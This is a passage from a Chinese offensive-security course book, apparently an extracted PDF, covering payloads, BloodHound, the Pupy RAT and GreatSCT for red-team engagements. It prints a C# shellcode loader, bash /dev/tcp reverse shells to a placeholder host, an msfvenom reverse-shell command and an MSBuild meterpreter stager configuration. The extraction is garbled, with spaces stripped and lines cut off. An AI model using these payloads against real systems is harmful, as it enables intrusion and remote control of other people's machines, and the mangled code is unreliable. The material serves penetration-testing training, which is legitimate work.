18. Array.Copy(XEvFDc,0,mwxyRsYNn,1,4);mwxyRsYNn[0]=0xBF;
19. returnmwxyRsYNn;}
20. staticvoidhcvPkmyIZ(byte[]fPnfqu){
21. if(fPnfqu!=null){
22. UInt32hcoGPUltNcjK=VirtualAlloc(0,(UInt32)fPnfqu.Length,0x1000,
0x40);
1、C#-payload
第十五课：基于第十课补充payload2
-135-
本文档使用书栈(BookStack.CN)构建
23. Marshal.Copy(fPnfqu,0,(IntPtr)(hcoGPUltNcjK),fPnfqu.Length);
24. IntPtrxOxEPnqW=IntPtr.Zero;
25. UInt32ooiiZLMzO=0;
26. IntPtrwxPyud=IntPtr.Zero;
27. xOxEPnqW=CreateThread(0,0,hcoGPUltNcjK,wxPyud,0,refooiiZLMzO);
28. WaitForSingleObject(xOxEPnqW,0xFFFFFFFF);}}
29. staticvoidMain(){
30. byte[]dCwAid=null;dCwAid=idCWVw("xx.xx.xx.xx",xx);
31. hcvPkmyIZ(dCwAid);}
32. [DllImport("kernel32")]privatestaticexternUInt32
VirtualAlloc(UInt32qWBbOS,UInt32HoKzSHMU,UInt[DllImport("kernel32")]private
staticextern
33. IntPtrCreateThread(UInt32tqUXybrozZ,UInt32FMmVpwin,UInt32H
34. [DllImport("kernel32")]privatestaticexternUInt32
35. WaitForSingleObject(IntPtrCApwDwK,UInt32uzGJUddCYTd);
1. i>&/dev/tcp/xx.xx.xx.xx/xx0>&1
2、Bash-payload
第十五课：基于第十课补充payload2
-136-
本文档使用书栈(BookStack.CN)构建
1. exec5<>/dev/tcp/xx.xx.xx.xx/xx
2. cat&5>&5;done
msfvenom生成bash
1. root@John:~#msfvenom-pcmd/unix/reverse_bashLHOST=xx.xx..xx.xxLPORT=xx>-f
附录：
第十五课：基于第十课补充payload2
-137-
本文档使用书栈(BookStack.CN)构建
raw>payload.sh
参数简化
项目地址：
https://github.com/g0tmi1k/mpc
Micropoor
第十五课：基于第十课补充payload2
-138-
本文档使用书栈(BookStack.CN)构建
在团体渗透测试的项目中，如红蓝对抗，团队渗透测试比赛等，最重要的是过程与结果实时共享于团
队，例如：A同学nmap目标站，B同学也nmap目标站，这在对抗比赛中是极其浪费时间也是非常容易引
起防火墙，日志服务器或其他设备的警觉。所以打算写一系列关于未来团队渗透的对抗。争取做到过程
与结果，团队实时共享。把曾经的团队作战经验形成一个适应对抗，比赛等的参考。
BloodHound是2016年出现大家的视线中，它是一个分析和解读AD中权限关系的一个工具。对于攻击
者来说，能快速的获取到域中的线索以便进行下一步攻击，而对于防御者来说，可以更快速的得知攻击
者可能采取的攻击途径以及域中的可突破的途径。
项目地址：
https://github.com/BloodHoundAD/BloodHound
Debian上安装：
1. root@John:~#apt-getinstallgitwgetcurl
2. root@John:~#wget-O-https://debian.neo4j.org/neotechnology.gpg.key|sudoapt-
keyadd
3. root@John:~#echo'debhttp://debian.neo4j.org/repostable/'|sudotee
/etc/apt/sources.list.d/neo4j.list
4. root@John:~#apt-getinstallopenjdk-8-jdkopenjdk-8-jre
5. root@John:~#apt-getinstallneo4j
前言：
BloodHound简介：
第十六课：红蓝对抗渗透测试1
-139-
本文档使用书栈(BookStack.CN)构建
6. root@John:~#echo"dbms.active_database=graph.db">>/etc/neo4j/neo4j.conf
7. root@John:~#echo"dbms.connector.http.address=0.0.0.0:7474">>
/etc/neo4j/neo4j.conf
8. root@John:~#echo"dbms.connector.bolt.address=0.0.0.0:7687">>
9. /etc/neo4j/neo4j.conf
10. root@John:~#tail/etc/neo4j/neo4j.conf
11. #Nameoftheservice
12. dbms.windows_service_name=neo4j
13. #********************************************************************
14. #OtherNeo4jsystemproperties
15. #********************************************************************
16.
17. dbms.jvm.additional=-Dunsupported.dbms.udc.source=tarball
18. dbms.active_database=graph.dbdbms.connector.http.address=0.0.0.0:7474
19. dbms.connector.bolt.address=0.0.0.0:7687
20.
21. root@John:~j#update-java-alternatives-ljava-1.8.0-openjdk-amd641081
/usr/lib/jvm/java-1.8.0-openjdk-amd64
22.
23. root@John:~j#update-java-alternatives-sjava-1.8.0-openjdk-amd64
下载地址：https://neo4j.com/download/
1. root@John:~/Downloads#tarzxvfneo4j-community-3.3.0-unix.tar.gz
2. root@John:~/Downloads/neo4j-community-3.3.0/bin#./neo4jstart
3. Activedatabase:graph.db
4. Directoriesinuse:
5. home:/root/Downloads/neo4j-community-3.3.0
6. config:/root/Downloads/neo4j-community-3.3.0/conf
7. logs:/root/Downloads/neo4j-community-3.3.0/logs
8. plugins:/root/Downloads/neo4j-community-3.3.0/plugins
9. import:/root/Downloads/neo4j-community-3.3.0/import
10. data:/root/Downloads/neo4j-community-3.3.0/data
11. certificates:/root/Downloads/neo4j-community-3.3.0/certificates
12. run:/root/Downloads/neo4j-community-3.3.0/run
13. StartingNeo4j.
14. WARNING:Max1024openfilesallowed,minimumof40000recommended.Seethe
Neo4jmanual.
15. Startedneo4j(pid4286).Itisavailableathttp://localhost:7474/Theremay
beashortdelayuntiltheserverisready.
16. See/root/Downloads/neo4j-community-3.3.0/logs/neo4j.logforcurrentstatus.
第十六课：红蓝对抗渗透测试1
-140-
本文档使用书栈(BookStack.CN)构建
1. root@John:~#apt-getinstallbloodhound
1. root@John:~/Downloads/neo4j-community-3.3.0/bin#nmap127.0.0.1-p7474
2.
3. StartingNmap7.40(https://nmap.org)at2017-12-0211:16EST
4. Nmapscanreportforlocalhost(127.0.0.1)Hostisup(0.00011slatency).
5. PORTSTATESERVICE
6. 7474/tcpopenneo4j
7.
8. Nmapdone:1IPaddress(1hostup)scannedin0.17seconds
第十六课：红蓝对抗渗透测试1
-141-
本文档使用书栈(BookStack.CN)构建
Micropoor
第十六课：红蓝对抗渗透测试1
-142-
本文档使用书栈(BookStack.CN)构建
在团体渗透测试的项目中，如红蓝对抗，团队渗透测试比赛等，最重要的是过程与结果实时共享于团
队，例如：A同学nmap目标站，B同学也nmap目标站，这在对抗比赛中是极其浪费时间也是非常容易引
起防火墙，日志服务器或其他设备的警觉。所以打算写一系列关于未来团队渗透的对抗。争取做到过程
与结果，团队实时共享。把曾经的团队作战经验形成一个适应对抗，比赛等的参考。
Pupy是一个开源，跨平台（Windows，Linux，OSX，Android），多功能RAT（远程管理工具）和主
要用python编写的后期开发工具。它具有全内存读取操作，进程注入等。Pupy可以使用各种传输进行
通信，迁移到进程（注入），从内存加载远程Python代码。
项目地址：https://github.com/n1nj4sec/pupy
1. root@John:~/Desktop#gitclonehttps://github.com/n1nj4sec/pupy.git
前言：
popy简介：
第十七课：红蓝对抗渗透测试2
-143-
本文档使用书栈(BookStack.CN)构建
1. root@John:~/Desktop/pupy/pupy#pipinstallrpyc
1. root@John:~/Desktop/pupy/pupy#gitsubmoduleupdate
1. root@John:~/Desktop/pupy/pupy#cd..
2. root@John:~/Desktop/pupy#pipinstall-rpupy/requirements.txt
第十七课：红蓝对抗渗透测试2
-144-
本文档使用书栈(BookStack.CN)构建
1. root@John:~/Desktop/pupy/#wget
https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz
1. root@John:~/Desktop/pupy#tarxvfpayload_templates.txz&&mv
payload_templates/*pupy/payload_templates/&&rmpayload_templates.txz&&rm-
rpayload_templates
第十七课：红蓝对抗渗透测试2
-145-
本文档使用书栈(BookStack.CN)构建
1. root@John:~/Desktop/pupy/pupy#apt-getinstallpython-xlib
第十七课：红蓝对抗渗透测试2
-146-
本文档使用书栈(BookStack.CN)构建
1. Collectingpyautogui
2. UsingcachedPyAutoGUI-0.9.36.tar.gz
3. Completeoutputfromcommandpythonsetup.pyegg_info:
4. Traceback(mostrecentcalllast):
5. File"",line1,in
6. File"/tmp/pip-build-a90ODY/pyautogui/setup.py",line6,in
version=__import__('pyautogui').__version__,
7. File"pyautogui/__init__.py",line115,in
8. from.import\_pyautogui_x11asplatformModule
9. File"pyautogui/_pyautogui_x11.py",line160,in
10. _display=Display(os.environ['DISPLAY'])
11. File"/usr/lib/python2.7/UserDict.py",line40,in__getitem__
12. raiseKeyError(key)
13. KeyError:'DISPLAY'
mustinstallonlocalserverwithGUI
Micropoor
附录：
第十七课：红蓝对抗渗透测试2
-147-
本文档使用书栈(BookStack.CN)构建
注：请多喝点热水或者凉白开，可预防肾结石，通风等。
痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。
工具介绍：
https://github.com/GreatSCT/GreatSCT
GreatSCT是以metasploitpayload为核心，白名单辅助payload执行框架。
1. root@John:~#gitclonehttps://github.com/GreatSCT/GreatSCT.git
2. Cloninginto'GreatSCT'...
3. remote:Enumeratingobjects:727,done.
4. remote:Total727(delta0),reused0(delta0),pack‐reused727
5. Receivingobjects:100%(727/727),10.64MiB|572.00KiB/s,done.
6. Resolvingdeltas:100%(384/384),done.
简介：
第十八课：红蓝对抗渗透测试3
-148-
本文档使用书栈(BookStack.CN)构建
第十八课：红蓝对抗渗透测试3
-149-
本文档使用书栈(BookStack.CN)构建
1. ===========================================================================
2. GreatScott!
3. ===========================================================================
4. [Web]:https://github.com/GreatSCT/GreatSCT|[Twitter]:@ConsciousHacker
5. ===========================================================================
6.
7. Payloadinformation:
8.
9. Name:PureMSBuildC#ReverseTCPStager
第十八课：红蓝对抗渗透测试3
-150-
本文档使用书栈(BookStack.CN)构建
10. Language:msbuild
11. Rating:Excellent
12. Description:purewindows/meterpreter/reverse_tcpstager,no
13. shellcode
14.
15. Payload:msbuild/meterpreter/rev_tcpselected
16.
17. RequiredOptions:
18.
19. NameValueDescription
20. ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
21. DOMAINXOptional:Requiredinternaldomain
22. EXPIRE_PAYLOADXOptional:Payloadsexpireafter"Y"days
23. HOSTNAMEXOptional:Requiredsystemhostname
24. INJECT_METHODVirtualVirtualorHeap
25. LHOSTIPoftheMetasploithandler
26. LPORT4444PortoftheMetasploithandler
27. PROCESSORSXOptional:Minimumnumberofprocessors
28. SLEEPXOptional:Sleep"Y"seconds,checkifaccelerated
29. TIMEZONEXOptional:ChecktovalidatenotinUTC
30. USERNAMEXOptional:Therequireduseraccount
31.
32. AvailableCommands:
33.
34. backGoback
35. exitCompletelyexitGreatSCT
36. generateGeneratethepayload
37. optionsShowtheshellcode'soptions
38. setSetshellcodeoption
39.
40. [msbuild/meterpreter/rev_tcp>>]setLHOST192.168.1.441
41.
42. [msbuild/meterpreter/rev_tcp>>]setLPORT53
Micropoor
第十八课：红蓝对抗渗透测试3